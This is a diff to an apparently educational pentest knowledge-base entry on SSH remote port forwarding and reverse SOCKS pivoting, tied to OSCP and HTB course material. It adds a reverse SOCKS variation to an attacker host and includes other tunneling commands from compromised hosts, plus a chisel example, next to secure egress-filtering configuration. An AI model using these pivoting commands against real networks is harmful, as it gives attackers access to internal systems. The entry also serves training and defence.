@@ -33,15 +33,15 @@
       "command": "ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.32.228 -vN"
     },
     {
-      "label": "OSCP Ch18 \u2014 remote port forward from compromised Linux host to Kali (bring internal service out)",
+      "label": "OSCP Ch18 — remote port forward from compromised Linux host to Kali (bring internal service out)",
       "command": "ssh -N -R 127.0.0.1:2345:<internal_ip>:5432 kali@<kali_ip>"
     },
     {
-      "label": "OSCP Ch18 \u2014 remote dynamic SOCKS (single-port -R = SOCKS on Kali loopback)",
+      "label": "OSCP Ch18 — remote dynamic SOCKS (single-port -R = SOCKS on Kali loopback)",
       "command": "ssh -N -R 9998 kali@<kali_ip>"
     }
   ],
-  "notes": "-vN gives verbose output with no remote shell. The target then connects to <pivot_ip>:<remote_port>, which tunnels to your handler. Also covered in: OSCP PEN-200 Chapter 18 (Port Redirection and SSH Tunneling). OSCP Ch18: remote port forward (-R) is run FROM the compromised host TO Kali \u2014 the reverse of -L. Format: ssh -N -R <kali_bind_ip>:<kali_port>:<internal_target_ip>:<internal_port> kali@<kali_ip>. Remote dynamic (-R <port> only, no host:port) opens a SOCKS listener on Kali's loopback on that port \u2014 combine with proxychains pointing at 127.0.0.1:<port> on Kali to reach all internal hosts.",
+  "notes": "-vN gives verbose output with no remote shell. The target then connects to <pivot_ip>:<remote_port>, which tunnels to your handler. Also covered in: OSCP PEN-200 Chapter 18 (Port Redirection and SSH Tunneling). OSCP Ch18: remote port forward (-R) is run FROM the compromised host TO Kali — the reverse of -L. Format: ssh -N -R <kali_bind_ip>:<kali_port>:<internal_target_ip>:<internal_port> kali@<kali_ip>. Remote dynamic (-R <port> only, no host:port) opens a SOCKS listener on Kali's loopback on that port — combine with proxychains pointing at 127.0.0.1:<port> on Kali to reach all internal hosts.",
   "references": [
     {
       "title": "HTB Academy - Pivoting, Tunneling, and Port Forwarding",
@@ -81,8 +81,15 @@
       "HTB M12",
       "MITRE T1572"
     ],
-    "misconfiguration": "The network lacks proper segmentation \u2014 a compromised DMZ host has direct layer-3 reachability to internal infrastructure (database servers, DCs, internal admin panels). No egress filtering blocks outbound HTTP/HTTPS connections to arbitrary hosts, allowing C2 channels and reverse tunnels. Internal firewalls only filter inbound traffic, not east-west or outbound.",
-    "vulnerable_config": "# Network design: flat Layer-3 network, all VLANs can reach each other\n# DMZ web server can ping/connect to: 10.10.10.0/24 (internal LAN), 10.10.20.0/24 (DB subnet)\n# No egress proxy \u2014 direct outbound HTTP to any IP allowed\n\n# iptables on pivot host (none blocking outbound):\niptables -L OUTPUT  # policy ACCEPT, no rules\n\n# This allows: chisel client 10.10.10.5:8080 R:socks\n# Attacker now has SOCKS5 access to the entire internal network",
-    "secure_config": "# Network segmentation with explicit allow rules:\n# DMZ -> Internet: only specific egress IPs (patch servers, DNS)\n# DMZ -> Internal: ONLY the DB ports this specific app needs\n# Internal -> Internal: segment by tier (web tier can't reach DC directly)\n\n# Egress filtering \u2014 block all outbound except known-good:\n# FortiGate / Palo Alto / iptables:\niptables -P OUTPUT DROP\niptables -A OUTPUT -d 8.8.8.8 -p udp --dport 53 -j ACCEPT  # DNS to specific server\niptables -A OUTPUT -p tcp --dport 443 -d <known_update_servers> -j ACCEPT\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n\n# IDS/IPS signatures for Chisel, ngrok, frp traffic patterns\n# DNS monitoring \u2014 detect DNS tunneling (dnscat2) via unusual query frequency/length\n# HTTP proxy with TLS inspection \u2014 detect reverse tunnels in HTTPS streams"
-  }
+    "misconfiguration": "The network lacks proper segmentation — a compromised DMZ host has direct layer-3 reachability to internal infrastructure (database servers, DCs, internal admin panels). No egress filtering blocks outbound HTTP/HTTPS connections to arbitrary hosts, allowing C2 channels and reverse tunnels. Internal firewalls only filter inbound traffic, not east-west or outbound.",
+    "vulnerable_config": "# Network design: flat Layer-3 network, all VLANs can reach each other\n# DMZ web server can ping/connect to: 10.10.10.0/24 (internal LAN), 10.10.20.0/24 (DB subnet)\n# No egress proxy — direct outbound HTTP to any IP allowed\n\n# iptables on pivot host (none blocking outbound):\niptables -L OUTPUT  # policy ACCEPT, no rules\n\n# This allows: chisel client 10.10.10.5:8080 R:socks\n# Attacker now has SOCKS5 access to the entire internal network",
+    "secure_config": "# Network segmentation with explicit allow rules:\n# DMZ -> Internet: only specific egress IPs (patch servers, DNS)\n# DMZ -> Internal: ONLY the DB ports this specific app needs\n# Internal -> Internal: segment by tier (web tier can't reach DC directly)\n\n# Egress filtering — block all outbound except known-good:\n# FortiGate / Palo Alto / iptables:\niptables -P OUTPUT DROP\niptables -A OUTPUT -d 8.8.8.8 -p udp --dport 53 -j ACCEPT  # DNS to specific server\niptables -A OUTPUT -p tcp --dport 443 -d <known_update_servers> -j ACCEPT\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n\n# IDS/IPS signatures for Chisel, ngrok, frp traffic patterns\n# DNS monitoring — detect DNS tunneling (dnscat2) via unusual query frequency/length\n# HTTP proxy with TLS inspection — detect reverse tunnels in HTTPS streams"
+  },
+  "type": "command",
+  "variations": [
+    {
+      "label": "Reverse SOCKS (-R dynamic)",
+      "command": "ssh -R <socks_port> <user>@<attacker>"
+    }
+  ]
 }
